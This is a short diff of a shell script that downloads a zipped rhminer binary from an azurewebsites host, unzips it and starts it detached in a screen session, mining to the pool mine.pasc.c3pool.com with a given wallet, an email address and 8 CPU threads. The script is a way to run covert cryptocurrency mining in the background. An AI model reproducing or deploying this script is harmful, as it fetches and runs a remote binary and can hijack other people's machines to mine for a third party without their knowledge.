@@ -4,6 +4,5 @@ wget "http://addmail.azurewebsites.net/rhminercpu.zip"
 unzip rhminercpu.zip
 cd rhminerCPU
 chmod +x rhminer
-chmod +x start.sh
-screen -d -m ./start.sh
+screen -d -m ./rhminer -r 20 -s mine.pasc.c3pool.com:12223 -su 1139099-44.0.hello/slicommeo@gmail.com -cpu -cputhreads 8
 echo -e "ok"
